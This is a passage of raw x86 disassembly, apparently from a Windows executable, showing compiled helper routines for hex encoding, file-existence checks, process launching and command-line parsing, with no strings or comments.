  40f189:	call   DWORD PTR ds:0x414074
  40f18f:	push   eax
  40f190:	push   0x404720
  40f195:	push   DWORD PTR ds:0x4130e8
  40f19b:	call   0x40e818
  40f1a0:	add    esp,0xc
  40f1a3:	jmp    0x40f1e2
  40f1a5:	and    DWORD PTR [ebp-0xc],0x0
  40f1a9:	mov    eax,0x4136d0
  40f1ae:	push   0x4136c4
  40f1b3:	push   0x40354c
  40f1b8:	push   0x40355c
  40f1bd:	push   eax
  40f1be:	push   DWORD PTR [ebp-0x8]
  40f1c1:	mov    ecx,edi
  40f1c3:	mov    DWORD PTR [ebp-0x18],0x40143c
  40f1ca:	mov    DWORD PTR [ebp-0x10],eax
  40f1cd:	mov    DWORD PTR [ebp-0x14],eax
  40f1d0:	call   DWORD PTR ds:0x414220
  40f1d6:	call   edi
  40f1d8:	lea    ecx,[ebp-0x18]
  40f1db:	mov    ebx,eax
  40f1dd:	call   0x405c45
  40f1e2:	push   esi
  40f1e3:	call   DWORD PTR ds:0x414120
  40f1e9:	pop    edi
  40f1ea:	mov    ecx,DWORD PTR [ebp-0x4]
  40f1ed:	mov    eax,ebx
  40f1ef:	pop    esi
  40f1f0:	xor    ecx,ebp
  40f1f2:	pop    ebx
  40f1f3:	call   0x411980
  40f1f8:	mov    esp,ebp
  40f1fa:	pop    ebp
  40f1fb:	ret    0xc
  40f1fe:	int3   
  40f1ff:	int3   
  40f200:	int3   
  40f201:	int3   
  40f202:	int3   
  40f203:	mov    edi,edi
  40f205:	push   ebp
  40f206:	mov    ebp,esp
  40f208:	push   ecx
  40f209:	push   ecx
  40f20a:	mov    eax,ds:0x413004
  40f20f:	xor    eax,ebp
  40f211:	mov    DWORD PTR [ebp-0x4],eax
  40f214:	push   ebx
  40f215:	push   esi
  40f216:	push   0x0
  40f218:	push   0x0
  40f21a:	push   0x404664
  40f21f:	mov    DWORD PTR [ebp-0x8],ecx
  40f222:	mov    ebx,0x80004005
  40f227:	call   DWORD PTR ds:0x41411c
  40f22d:	mov    esi,eax
  40f22f:	test   esi,esi
  40f231:	jne    0x40f24f
  40f233:	call   DWORD PTR ds:0x414074
  40f239:	push   eax
  40f23a:	push   0x4047b0
  40f23f:	push   DWORD PTR ds:0x4130e8
  40f245:	call   0x40e818
  40f24a:	add    esp,0xc
  40f24d:	jmp    0x40f295
  40f24f:	push   edi
  40f250:	push   0x404810
  40f255:	push   esi
  40f256:	call   DWORD PTR ds:0x414048
  40f25c:	mov    edi,eax
  40f25e:	test   edi,edi
  40f260:	jne    0x40f27e
  40f262:	call   DWORD PTR ds:0x414074
  40f268:	push   eax
  40f269:	push   0x404820
  40f26e:	push   DWORD PTR ds:0x4130e8
  40f274:	call   0x40e818
  40f279:	add    esp,0xc
  40f27c:	jmp    0x40f28d
  40f27e:	push   DWORD PTR [ebp-0x8]
  40f281:	mov    ecx,edi
  40f283:	call   DWORD PTR ds:0x414220
  40f289:	call   edi
  40f28b:	mov    ebx,eax
  40f28d:	push   esi
  40f28e:	call   DWORD PTR ds:0x414120
  40f294:	pop    edi
  40f295:	mov    ecx,DWORD PTR [ebp-0x4]
  40f298:	mov    eax,ebx
  40f29a:	pop    esi
  40f29b:	xor    ecx,ebp
  40f29d:	pop    ebx
  40f29e:	call   0x411980
  40f2a3:	mov    esp,ebp
  40f2a5:	pop    ebp
  40f2a6:	ret    
  40f2a7:	int3   
  40f2a8:	int3   
  40f2a9:	int3   
  40f2aa:	int3   
  40f2ab:	int3   
  40f2ac:	mov    edi,edi
  40f2ae:	push   ebp
  40f2af:	mov    ebp,esp
  40f2b1:	push   ecx
  40f2b2:	push   ecx
  40f2b3:	mov    eax,ds:0x413004
  40f2b8:	xor    eax,ebp
  40f2ba:	mov    DWORD PTR [ebp-0x4],eax
  40f2bd:	push   ebx
  40f2be:	push   esi
  40f2bf:	push   0x0
  40f2c1:	push   0x0
  40f2c3:	push   0x404664
  40f2c8:	mov    DWORD PTR [ebp-0x8],ecx
  40f2cb:	mov    ebx,0x80004005
  40f2d0:	call   DWORD PTR ds:0x41411c
  40f2d6:	mov    esi,eax
  40f2d8:	test   esi,esi
  40f2da:	jne    0x40f2f8
  40f2dc:	call   DWORD PTR ds:0x414074
  40f2e2:	push   eax
  40f2e3:	push   0x404888
  40f2e8:	push   DWORD PTR ds:0x4130e8
  40f2ee:	call   0x40e818
  40f2f3:	add    esp,0xc
  40f2f6:	jmp    0x40f33e
  40f2f8:	push   edi
  40f2f9:	push   0x4048ec
  40f2fe:	push   esi
  40f2ff:	call   DWORD PTR ds:0x414048
  40f305:	mov    edi,eax
  40f307:	test   edi,edi
  40f309:	jne    0x40f327
  40f30b:	call   DWORD PTR ds:0x414074
  40f311:	push   eax
  40f312:	push   0x404900
  40f317:	push   DWORD PTR ds:0x4130e8
  40f31d:	call   0x40e818
  40f322:	add    esp,0xc
  40f325:	jmp    0x40f336
  40f327:	push   DWORD PTR [ebp-0x8]
  40f32a:	mov    ecx,edi
  40f32c:	call   DWORD PTR ds:0x414220
  40f332:	call   edi
  40f334:	mov    ebx,eax
  40f336:	push   esi
  40f337:	call   DWORD PTR ds:0x414120
  40f33d:	pop    edi
  40f33e:	mov    ecx,DWORD PTR [ebp-0x4]
  40f341:	mov    eax,ebx
  40f343:	pop    esi
  40f344:	xor    ecx,ebp
  40f346:	pop    ebx
  40f347:	call   0x411980
  40f34c:	mov    esp,ebp
  40f34e:	pop    ebp
  40f34f:	ret    
  40f350:	int3   
  40f351:	int3   
  40f352:	int3   
  40f353:	int3   
  40f354:	int3   
  40f355:	mov    edi,edi
  40f357:	push   esi
  40f358:	push   edi
  40f359:	mov    edi,ecx
  40f35b:	mov    esi,edx
  40f35d:	test   edi,edi
  40f35f:	je     0x40f3bf
  40f361:	test   esi,esi
  40f363:	jle    0x40f3bf
  40f365:	lea    eax,[esi*4+0x4]
  40f36c:	push   eax
  40f36d:	call   DWORD PTR ds:0x4141b0
  40f373:	test   eax,eax
  40f375:	je     0x40f3c1
  40f377:	xor    ecx,ecx
  40f379:	test   esi,esi
  40f37b:	jle    0x40f3b7
  40f37d:	mov    dl,BYTE PTR [ecx+edi*1]
  40f380:	shr    dl,0x4
  40f383:	cmp    dl,0x9
  40f386:	movzx  edx,dl
  40f389:	ja     0x40f390
  40f38b:	add    edx,0x30
  40f38e:	jmp    0x40f393
  40f390:	add    edx,0x37
  40f393:	mov    WORD PTR [eax+ecx*4],dx
  40f397:	mov    dl,BYTE PTR [ecx+edi*1]
  40f39a:	and    dl,0xf
  40f39d:	cmp    dl,0x9
  40f3a0:	movzx  edx,dl
  40f3a3:	ja     0x40f3aa
  40f3a5:	add    edx,0x30
  40f3a8:	jmp    0x40f3ad
  40f3aa:	add    edx,0x37
  40f3ad:	mov    WORD PTR [eax+ecx*4+0x2],dx
  40f3b2:	inc    ecx
  40f3b3:	cmp    ecx,esi
  40f3b5:	jl     0x40f37d
  40f3b7:	xor    ecx,ecx
  40f3b9:	mov    WORD PTR [eax+esi*4],cx
  40f3bd:	jmp    0x40f3c1
  40f3bf:	xor    eax,eax
  40f3c1:	pop    edi
  40f3c2:	pop    esi
  40f3c3:	ret    
  40f3c4:	int3   
  40f3c5:	int3   
  40f3c6:	int3   
  40f3c7:	int3   
  40f3c8:	int3   
  40f3c9:	mov    edi,edi
  40f3cb:	push   ebp
  40f3cc:	mov    ebp,esp
  40f3ce:	push   ecx
  40f3cf:	push   ecx
  40f3d0:	push   ebx
  40f3d1:	mov    ebx,ecx
  40f3d3:	mov    DWORD PTR [ebp-0x8],edx
  40f3d6:	test   ebx,ebx
  40f3d8:	jne    0x40f3de
  40f3da:	xor    eax,eax
  40f3dc:	jmp    0x40f45b
  40f3de:	push   esi
  40f3df:	mov    esi,ebx
  40f3e1:	push   edi
  40f3e2:	xor    edi,edi
  40f3e4:	lea    ecx,[esi+0x2]
  40f3e7:	mov    ax,WORD PTR [esi]
  40f3ea:	add    esi,0x2
  40f3ed:	cmp    ax,di
  40f3f0:	jne    0x40f3e7
  40f3f2:	sub    esi,ecx
  40f3f4:	sar    esi,1
  40f3f6:	shr    esi,1
  40f3f8:	push   esi
  40f3f9:	call   DWORD PTR ds:0x4141b0
  40f3ff:	mov    DWORD PTR [ebp-0x4],eax
  40f402:	test   eax,eax
  40f404:	je     0x40f459
  40f406:	mov    eax,DWORD PTR [ebp-0x8]
  40f409:	test   eax,eax
  40f40b:	je     0x40f40f
  40f40d:	mov    DWORD PTR [eax],esi
  40f40f:	test   esi,esi
  40f411:	jle    0x40f456
  40f413:	push   0x9
  40f415:	pop    edx
  40f416:	mov    DWORD PTR [ebp-0x8],edx
  40f419:	movzx  ecx,WORD PTR [ebx+edi*4]
  40f41d:	lea    eax,[ecx-0x30]
  40f420:	cmp    ax,dx
  40f423:	ja     0x40f42a
  40f425:	sub    cl,0x30
  40f428:	jmp    0x40f42d
  40f42a:	sub    cl,0x37
  40f42d:	movzx  edx,WORD PTR [ebx+edi*4+0x2]
  40f432:	lea    eax,[edx-0x30]
  40f435:	cmp    ax,WORD PTR [ebp-0x8]
  40f439:	lea    eax,[edx-0x30]
  40f43c:	jbe    0x40f441
  40f43e:	lea    eax,[edx-0x37]
  40f441:	shl    cl,0x4
  40f444:	add    cl,al
  40f446:	mov    eax,DWORD PTR [ebp-0x4]
  40f449:	push   0x9
  40f44b:	pop    edx
  40f44c:	mov    BYTE PTR [edi+eax*1],cl
  40f44f:	inc    edi
  40f450:	cmp    edi,esi
  40f452:	jl     0x40f419
  40f454:	jmp    0x40f459
  40f456:	mov    eax,DWORD PTR [ebp-0x4]
  40f459:	pop    edi
  40f45a:	pop    esi
  40f45b:	pop    ebx
  40f45c:	mov    esp,ebp
  40f45e:	pop    ebp
  40f45f:	ret    
  40f460:	int3   
  40f461:	int3   
  40f462:	int3   
  40f463:	int3   
  40f464:	int3   
  40f465:	mov    edi,edi
  40f467:	push   ebp
  40f468:	mov    ebp,esp
  40f46a:	sub    esp,0x3c
  40f46d:	push   ebx
  40f46e:	push   esi
  40f46f:	push   edi
  40f470:	push   0x38
  40f472:	xor    ebx,ebx
  40f474:	lea    eax,[ebp-0x38]
  40f477:	push   ebx
  40f478:	push   eax
  40f479:	mov    edi,edx
  40f47b:	mov    esi,ecx
  40f47d:	call   0x412060
  40f482:	mov    eax,DWORD PTR [ebp+0xc]
  40f485:	add    esp,0xc
  40f488:	mov    DWORD PTR [ebp-0x38],eax
  40f48b:	mov    eax,DWORD PTR [ebp+0x10]
  40f48e:	mov    DWORD PTR [ebp-0x20],eax
  40f491:	mov    eax,DWORD PTR [ebp+0x8]
  40f494:	mov    DWORD PTR [ebp-0x24],eax
  40f497:	lea    eax,[ebp-0x3c]
  40f49a:	push   eax
  40f49b:	mov    DWORD PTR [ebp-0x3c],0x3c
  40f4a2:	mov    DWORD PTR [ebp-0x2c],esi
  40f4a5:	mov    DWORD PTR [ebp-0x28],edi
  40f4a8:	call   DWORD PTR ds:0x414148
  40f4ae:	test   eax,eax
  40f4b0:	je     0x40f4d0
  40f4b2:	cmp    DWORD PTR [ebp-0x4],ebx
  40f4b5:	je     0x40f4ee
  40f4b7:	push   0xea60
  40f4bc:	push   DWORD PTR [ebp-0x4]
  40f4bf:	call   DWORD PTR ds:0x4140bc
  40f4c5:	push   DWORD PTR [ebp-0x4]
  40f4c8:	call   DWORD PTR ds:0x414084
  40f4ce:	jmp    0x40f4ee
  40f4d0:	call   DWORD PTR ds:0x414074
  40f4d6:	mov    ebx,eax
  40f4d8:	test   ebx,ebx
  40f4da:	jle    0x40f4e7
  40f4dc:	movzx  ebx,bx
  40f4df:	or     ebx,0x80070000
  40f4e5:	test   ebx,ebx
  40f4e7:	js     0x40f4ee
  40f4e9:	mov    ebx,0x8000ffff
  40f4ee:	pop    edi
  40f4ef:	pop    esi
  40f4f0:	mov    eax,ebx
  40f4f2:	pop    ebx
  40f4f3:	mov    esp,ebp
  40f4f5:	pop    ebp
  40f4f6:	ret    0xc
  40f4f9:	int3   
  40f4fa:	int3   
  40f4fb:	int3   
  40f4fc:	int3   
  40f4fd:	int3   
  40f4fe:	mov    edi,edi
  40f500:	push   ebx
  40f501:	push   esi
  40f502:	push   edi
  40f503:	mov    edi,ecx
  40f505:	xor    esi,esi
  40f507:	push   0x68
  40f509:	mov    DWORD PTR [edi],0xd
  40f50f:	mov    DWORD PTR [edi+0x4],0x1
  40f516:	mov    DWORD PTR [edi+0x8],esi
  40f519:	mov    DWORD PTR [edi+0xc],esi
  40f51c:	call   DWORD PTR ds:0x4141b0
  40f522:	mov    DWORD PTR [edi+0xc],eax
  40f525:	test   eax,eax
  40f527:	je     0x40f57b
  40f529:	push   DWORD PTR [esi+0x413020]
  40f52f:	call   DWORD PTR ds:0x414068
  40f535:	lea    ebx,[eax+0x1]
  40f538:	lea    eax,[ebx+ebx*1]
  40f53b:	push   eax
  40f53c:	call   DWORD PTR ds:0x4141b0
  40f542:	mov    ecx,DWORD PTR [edi+0xc]
  40f545:	mov    DWORD PTR [esi+ecx*1],eax
  40f548:	mov    eax,DWORD PTR [edi+0xc]
  40f54b:	mov    ecx,DWORD PTR [esi+eax*1]
  40f54e:	test   ecx,ecx
  40f550:	je     0x40f573
  40f552:	push   0x900
  40f557:	push   ecx
  40f558:	push   ecx
  40f559:	push   DWORD PTR [esi+0x413020]
  40f55f:	mov    edx,ebx
  40f561:	call   0x410ebe
  40f566:	mov    ecx,DWORD PTR [edi+0xc]
  40f569:	mov    eax,DWORD PTR [esi+0x413024]
  40f56f:	mov    DWORD PTR [esi+ecx*1+0x4],eax
  40f573:	add    esi,0x8
  40f576:	cmp    esi,0x68
  40f579:	jb     0x40f529
  40f57b:	mov    eax,edi
  40f57d:	pop    edi
  40f57e:	pop    esi
  40f57f:	pop    ebx
  40f580:	ret    0x10
  40f583:	int3   
  40f584:	int3   
  40f585:	int3   
  40f586:	int3   
  40f587:	int3   
  40f588:	mov    edi,edi
  40f58a:	push   ebp
  40f58b:	mov    ebp,esp
  40f58d:	push   esi
  40f58e:	xor    esi,esi
  40f590:	push   esi
  40f591:	push   0x80
  40f596:	push   0x3
  40f598:	push   esi
  40f599:	push   0x1
  40f59b:	push   esi
  40f59c:	push   DWORD PTR [ebp+0x8]
  40f59f:	call   DWORD PTR ds:0x41405c
  40f5a5:	cmp    eax,0xffffffff
  40f5a8:	je     0x40f5b2
  40f5aa:	push   eax
  40f5ab:	inc    esi
  40f5ac:	call   DWORD PTR ds:0x414084
  40f5b2:	mov    eax,esi
  40f5b4:	pop    esi
  40f5b5:	pop    ebp
  40f5b6:	ret    0x4
  40f5b9:	int3   
  40f5ba:	int3   
  40f5bb:	int3   
  40f5bc:	int3   
  40f5bd:	int3   
  40f5be:	mov    edi,edi
  40f5c0:	push   ebp
  40f5c1:	mov    ebp,esp
  40f5c3:	sub    esp,0xa2c
  40f5c9:	mov    eax,ds:0x413004
  40f5ce:	xor    eax,ebp
  40f5d0:	mov    DWORD PTR [ebp-0x4],eax
  40f5d3:	push   ebx
  40f5d4:	push   esi
  40f5d5:	push   edi
  40f5d6:	mov    edi,DWORD PTR [ebp+0x8]
  40f5d9:	xor    esi,esi
  40f5db:	push   edi
  40f5dc:	call   0x40f588
  40f5e1:	test   eax,eax
  40f5e3:	je     0x40f660
  40f5e5:	push   edi
  40f5e6:	lea    ecx,[ebp-0xa2c]
  40f5ec:	call   0x40eb66
  40f5f1:	xor    eax,eax
  40f5f3:	cmp    ax,WORD PTR [ebp-0x822]
  40f5fa:	jne    0x40f65d
  40f5fc:	cmp    ax,WORD PTR [ebp-0x818]
  40f603:	jne    0x40f65d
  40f605:	cmp    ax,WORD PTR [ebp-0x616]
  40f60c:	je     0x40f65d
  40f60e:	cmp    ax,WORD PTR [ebp-0x414]
  40f615:	je     0x40f65d
  40f617:	lea    eax,[ebp-0x210]
  40f61d:	mov    ebx,0x104
  40f622:	push   eax
  40f623:	push   ebx
  40f624:	call   DWORD PTR ds:0x41408c
  40f62a:	test   eax,eax
  40f62c:	je     0x40f660
  40f62e:	lea    eax,[ebp-0x414]
  40f634:	push   eax
  40f635:	lea    eax,[ebp-0x616]
  40f63b:	push   eax
  40f63c:	lea    eax,[ebp-0x210]
  40f642:	push   eax
  40f643:	push   0x40376c
  40f648:	push   0x900
  40f64d:	push   esi
  40f64e:	push   esi
  40f64f:	push   ebx
  40f650:	push   edi
  40f651:	call   0x410f98
  40f656:	add    esp,0x24
  40f659:	test   eax,eax
  40f65b:	js     0x40f660
  40f65d:	xor    esi,esi
  40f65f:	inc    esi
  40f660:	mov    ecx,DWORD PTR [ebp-0x4]
  40f663:	mov    eax,esi
  40f665:	pop    edi
  40f666:	pop    esi
  40f667:	xor    ecx,ebp
  40f669:	pop    ebx
  40f66a:	call   0x411980
  40f66f:	mov    esp,ebp
  40f671:	pop    ebp
  40f672:	ret    0x8
  40f675:	int3   
  40f676:	int3   
  40f677:	int3   
  40f678:	int3   
  40f679:	int3   
  40f67a:	mov    edi,edi
  40f67c:	push   ebp
  40f67d:	mov    ebp,esp
  40f67f:	sub    esp,0x214
  40f685:	mov    eax,ds:0x413004
  40f68a:	xor    eax,ebp
  40f68c:	mov    DWORD PTR [ebp-0x4],eax
  40f68f:	mov    eax,DWORD PTR [ebp+0x10]
  40f692:	push   ebx
  40f693:	mov    ebx,DWORD PTR [ebp+0xc]
  40f696:	push   esi
  40f697:	mov    esi,DWORD PTR [ebp+0x8]
  40f69a:	mov    DWORD PTR [ebp-0x214],eax
  40f6a0:	cmp    DWORD PTR [ebx],0x0
  40f6a3:	push   esi
  40f6a4:	jne    0x40f77a
  40f6aa:	call   0x40f588
  40f6af:	test   eax,eax
  40f6b1:	je     0x40f6ea
  40f6b3:	push   0x900
  40f6b8:	push   ecx
  40f6b9:	push   ecx
  40f6ba:	mov    ecx,DWORD PTR [ebp-0x214]
  40f6c0:	mov    edx,0x104
  40f6c5:	push   esi
  40f6c6:	mov    DWORD PTR [ebx],0x1
  40f6cc:	call   0x410ebe
  40f6d1:	push   esi
  40f6d2:	push   0x4049b8
  40f6d7:	push   DWORD PTR ds:0x4130e8
  40f6dd:	call   0x40e818
  40f6e2:	add    esp,0xc
  40f6e5:	jmp    0x40f76d
  40f6ea:	xor    eax,eax
  40f6ec:	push   0x208
  40f6f1:	push   eax
  40f6f2:	mov    WORD PTR [ebp-0x210],ax
  40f6f9:	lea    eax,[ebp-0x20e]
  40f6ff:	push   eax
  40f700:	call   0x412060
  40f705:	add    esp,0xc
  40f708:	lea    eax,[ebp-0x210]
  40f70e:	push   0x104
  40f713:	push   eax
  40f714:	push   esi
  40f715:	call   DWORD PTR ds:0x4140b4
  40f71b:	test   eax,eax
  40f71d:	je     0x40f78d
  40f71f:	lea    eax,[ebp-0x210]
  40f725:	push   eax
  40f726:	push   0x404a00
  40f72b:	push   DWORD PTR ds:0x4130e8
  40f731:	call   0x40e818
  40f736:	add    esp,0xc
  40f739:	lea    eax,[ebp-0x210]
  40f73f:	push   eax
  40f740:	call   0x40f588
  40f745:	test   eax,eax
  40f747:	lea    eax,[ebp-0x210]
  40f74d:	je     0x40f772
  40f74f:	push   0x900
  40f754:	push   ecx
  40f755:	push   ecx
  40f756:	mov    ecx,DWORD PTR [ebp-0x214]
  40f75c:	mov    edx,0x104
  40f761:	push   eax
  40f762:	mov    DWORD PTR [ebx],0x1
  40f768:	call   0x410ebe
  40f76d:	xor    eax,eax
  40f76f:	inc    eax
  40f770:	jmp    0x40f78f
  40f772:	push   eax
  40f773:	push   0x404a48
  40f778:	jmp    0x40f77f
  40f77a:	push   0x404a98
  40f77f:	push   DWORD PTR ds:0x4130e8
  40f785:	call   0x40e818
  40f78a:	add    esp,0xc
  40f78d:	xor    eax,eax
  40f78f:	mov    ecx,DWORD PTR [ebp-0x4]
  40f792:	pop    esi
  40f793:	xor    ecx,ebp
  40f795:	pop    ebx
  40f796:	call   0x411980
  40f79b:	mov    esp,ebp
  40f79d:	pop    ebp
  40f79e:	ret    0xc
  40f7a1:	int3   
  40f7a2:	int3   
  40f7a3:	int3   
  40f7a4:	int3   
  40f7a5:	int3   
  40f7a6:	mov    edi,edi
  40f7a8:	push   ebp
  40f7a9:	mov    ebp,esp
  40f7ab:	sub    esp,0x18
  40f7ae:	mov    eax,ds:0x413004
  40f7b3:	xor    eax,ebp
  40f7b5:	mov    DWORD PTR [ebp-0x4],eax
  40f7b8:	mov    eax,DWORD PTR [ebp+0xc]
  40f7bb:	and    DWORD PTR [ebp-0x10],0x0
  40f7bf:	mov    DWORD PTR [ebp-0x18],eax
  40f7c2:	push   ebx
  40f7c3:	mov    ebx,DWORD PTR [ebp+0x8]
  40f7c6:	push   esi
  40f7c7:	push   edi
  40f7c8:	mov    edi,ecx
  40f7ca:	mov    ecx,DWORD PTR [ebp+0x10]
  40f7cd:	mov    DWORD PTR [ebp-0x14],ecx
  40f7d0:	test   eax,eax
  40f7d2:	je     0x40fa3b
  40f7d8:	test   ecx,ecx
  40f7da:	je     0x40fa3b
  40f7e0:	and    DWORD PTR [eax],0x0
  40f7e3:	mov    eax,DWORD PTR [edi+0x4]
  40f7e6:	push   0x3
  40f7e8:	pop    esi
  40f7e9:	push   ebx
  40f7ea:	push   0x404ae0
  40f7ef:	push   DWORD PTR ds:0x4130e8
  40f7f5:	mov    DWORD PTR [ebp-0xc],eax
  40f7f8:	mov    DWORD PTR [ebp-0x8],ebx
  40f7fb:	call   0x40e818
  40f800:	add    esp,0xc
  40f803:	mov    ecx,ebx
  40f805:	movzx  eax,WORD PTR [ecx]
  40f808:	push   0x20
  40f80a:	pop    edx
  40f80b:	sub    eax,0x0
  40f80e:	je     0x40f98c
  40f814:	sub    eax,edx
  40f816:	je     0x40f8e1
  40f81c:	dec    eax
  40f81d:	sub    eax,0x1
  40f820:	je     0x40f836
  40f822:	test   esi,esi
  40f824:	je     0x40f82f
  40f826:	cmp    esi,0x2
  40f829:	jne    0x40f9e9
  40f82f:	push   0x3
  40f831:	jmp    0x40f9e8
  40f836:	cmp    esi,0x1
  40f839:	jne    0x40f8d9
  40f83f:	xor    eax,eax
  40f841:	push   ebx
  40f842:	mov    WORD PTR [ecx],ax
  40f845:	call   DWORD PTR ds:0x414184
  40f84b:	cmp    DWORD PTR [ebp-0xc],0x0
  40f84f:	mov    ebx,eax
  40f851:	je     0x40f86d
  40f853:	and    DWORD PTR [ebp-0xc],0x0
  40f857:	push   ebx
  40f858:	push   0x404b48
  40f85d:	push   DWORD PTR ds:0x4130e8
  40f863:	call   0x40e818
  40f868:	add    esp,0xc
  40f86b:	jmp    0x40f8a6
  40f86d:	xor    esi,esi
  40f86f:	cmp    DWORD PTR [edi],esi
  40f871:	jbe    0x40f88f
  40f873:	mov    eax,DWORD PTR [edi+0xc]
  40f876:	cmp    DWORD PTR [eax+esi*8],0x0
  40f87a:	je     0x40f88a
  40f87c:	push   ebx
  40f87d:	push   DWORD PTR [eax+esi*8]
  40f880:	call   DWORD PTR ds:0x41407c
  40f886:	test   eax,eax
  40f888:	je     0x40f8c5
  40f88a:	inc    esi
  40f88b:	cmp    esi,DWORD PTR [edi]
  40f88d:	jb     0x40f873
  40f88f:	push   DWORD PTR [ebp-0x14]
  40f892:	lea    eax,[ebp-0x10]
  40f895:	mov    ecx,edi
  40f897:	push   eax
  40f898:	push   ebx
  40f899:	call   0x40f67a
  40f89e:	test   eax,eax
  40f8a0:	je     0x40fa3b
  40f8a6:	mov    eax,DWORD PTR [ebp-0x8]
  40f8a9:	push   0x22
  40f8ab:	pop    ecx
  40f8ac:	push   eax
  40f8ad:	mov    WORD PTR [eax],cx
  40f8b0:	call   DWORD PTR ds:0x414184
  40f8b6:	mov    ebx,eax
  40f8b8:	mov    ecx,ebx
  40f8ba:	push   0x2
  40f8bc:	mov    DWORD PTR [ebp-0x8],ecx
  40f8bf:	pop    esi
  40f8c0:	jmp    0x40f805
  40f8c5:	mov    eax,DWORD PTR [edi+0xc]
  40f8c8:	mov    ecx,DWORD PTR [ebp-0x18]
  40f8cb:	push   ebx
  40f8cc:	push   0x404970
  40f8d1:	mov    eax,DWORD PTR [eax+esi*8+0x4]
  40f8d5:	or     DWORD PTR [ecx],eax
  40f8d7:	jmp    0x40f85d
  40f8d9:	xor    esi,esi
  40f8db:	inc    esi
  40f8dc:	jmp    0x40f9e9
  40f8e1:	cmp    esi,0x3
  40f8e4:	jne    0x40f978
  40f8ea:	xor    eax,eax
  40f8ec:	mov    WORD PTR [ecx],ax
  40f8ef:	cmp    DWORD PTR [ebp-0xc],eax
  40f8f2:	je     0x40f90d
  40f8f4:	and    DWORD PTR [ebp-0xc],eax
  40f8f7:	push   ebx
  40f8f8:	push   0x404b48
  40f8fd:	push   DWORD PTR ds:0x4130e8
  40f903:	call   0x40e818
  40f908:	add    esp,0xc
  40f90b:	jmp    0x40f946
  40f90d:	xor    esi,esi
  40f90f:	cmp    DWORD PTR [edi],eax
  40f911:	jbe    0x40f92f
  40f913:	mov    eax,DWORD PTR [edi+0xc]
  40f916:	cmp    DWORD PTR [eax+esi*8],0x0
  40f91a:	je     0x40f92a
  40f91c:	push   ebx
  40f91d:	push   DWORD PTR [eax+esi*8]
  40f920:	call   DWORD PTR ds:0x41407c
  40f926:	test   eax,eax
  40f928:	je     0x40f964
  40f92a:	inc    esi
  40f92b:	cmp    esi,DWORD PTR [edi]
  40f92d:	jb     0x40f913
  40f92f:	push   DWORD PTR [ebp-0x14]
  40f932:	lea    eax,[ebp-0x10]
  40f935:	mov    ecx,edi
  40f937:	push   eax
  40f938:	push   ebx
  40f939:	call   0x40f67a
  40f93e:	test   eax,eax
  40f940:	je     0x40fa3b
  40f946:	mov    eax,DWORD PTR [ebp-0x8]
  40f949:	push   0x20
  40f94b:	pop    ecx
  40f94c:	push   eax
  40f94d:	mov    WORD PTR [eax],cx
  40f950:	call   DWORD PTR ds:0x414184
  40f956:	mov    ebx,eax
  40f958:	xor    esi,esi
  40f95a:	mov    ecx,ebx
  40f95c:	mov    DWORD PTR [ebp-0x8],ecx
  40f95f:	jmp    0x40f805
  40f964:	mov    eax,DWORD PTR [edi+0xc]
  40f967:	mov    ecx,DWORD PTR [ebp-0x18]
  40f96a:	push   ebx
  40f96b:	push   0x404970
  40f970:	mov    eax,DWORD PTR [eax+esi*8+0x4]
  40f974:	or     DWORD PTR [ecx],eax
  40f976:	jmp    0x40f8fd
  40f978:	test   esi,esi
  40f97a:	je     0x40f981
  40f97c:	cmp    esi,0x2
  40f97f:	jne    0x40f9e9
  40f981:	push   ebx
  40f982:	call   DWORD PTR ds:0x414184
  40f988:	mov    ebx,eax
  40f98a:	jmp    0x40f9e9
  40f98c:	cmp    esi,0x2
  40f98f:	je     0x40f9e6
  40f991:	cmp    DWORD PTR [ebp-0xc],0x0
  40f995:	je     0x40f9b1
  40f997:	and    DWORD PTR [ebp-0xc],0x0
  40f99b:	push   ebx
  40f99c:	push   0x404b48
  40f9a1:	push   DWORD PTR ds:0x4130e8
  40f9a7:	call   0x40e818
  40f9ac:	add    esp,0xc
  40f9af:	jmp    0x40f9e6
  40f9b1:	xor    esi,esi
  40f9b3:	cmp    DWORD PTR [edi],esi
  40f9b5:	jbe    0x40f9d3
  40f9b7:	mov    eax,DWORD PTR [edi+0xc]
  40f9ba:	cmp    DWORD PTR [eax+esi*8],0x0
  40f9be:	je     0x40f9ce
  40f9c0:	push   ebx
  40f9c1:	push   DWORD PTR [eax+esi*8]
  40f9c4:	call   DWORD PTR ds:0x41407c
  40f9ca:	test   eax,eax
  40f9cc:	je     0x40fa12
  40f9ce:	inc    esi
  40f9cf:	cmp    esi,DWORD PTR [edi]
  40f9d1:	jb     0x40f9b7
  40f9d3:	push   DWORD PTR [ebp-0x14]
  40f9d6:	lea    eax,[ebp-0x10]
  40f9d9:	mov    ecx,edi
  40f9db:	push   eax
  40f9dc:	push   ebx
  40f9dd:	call   0x40f67a
  40f9e2:	test   eax,eax
  40f9e4:	je     0x40fa3b
  40f9e6:	push   0x4
  40f9e8:	pop    esi
  40f9e9:	mov    eax,DWORD PTR [ebp-0x8]
  40f9ec:	push   eax
  40f9ed:	call   DWORD PTR ds:0x414184
  40f9f3:	mov    ecx,eax
  40f9f5:	mov    DWORD PTR [ebp-0x8],ecx
  40f9f8:	cmp    esi,0x4
  40f9fb:	jne    0x40f805
  40fa01:	cmp    DWORD PTR [ebp-0x10],0x0
  40fa05:	je     0x40fa29
  40fa07:	push   ecx
  40fa08:	push   DWORD PTR [ebp-0x14]
  40fa0b:	call   0x40f5be
  40fa10:	jmp    0x40fa3d
  40fa12:	mov    eax,DWORD PTR [edi+0xc]
  40fa15:	mov    ecx,DWORD PTR [ebp-0x18]
  40fa18:	push   ebx
  40fa19:	push   0x404970
  40fa1e:	mov    eax,DWORD PTR [eax+esi*8+0x4]
  40fa22:	or     DWORD PTR [ecx],eax
  40fa24:	jmp    0x40f9a1
  40fa29:	mov    ecx,DWORD PTR [ebp-0x18]
  40fa2c:	cmp    DWORD PTR [ecx],0x0
  40fa2f:	je     0x40fa36
  40fa31:	xor    eax,eax
  40fa33:	inc    eax
  40fa34:	jmp    0x40fa3d
  40fa36:	mov    eax,DWORD PTR [edi+0x8]
  40fa39:	jmp    0x40fa3d
  40fa3b:	xor    eax,eax
  40fa3d:	mov    ecx,DWORD PTR [ebp-0x4]
  40fa40:	pop    edi
  40fa41:	pop    esi
  40fa42:	xor    ecx,ebp
  40fa44:	pop    ebx
  40fa45:	call   0x411980
  40fa4a:	mov    esp,ebp
  40fa4c:	pop    ebp
  40fa4d:	ret    0x10
  40fa50:	int3   
  40fa51:	int3   
  40fa52:	int3   
  40fa53:	int3   
  40fa54:	int3   
  40fa55:	mov    edi,edi
  40fa57:	push   esi
  40fa58:	push   edi
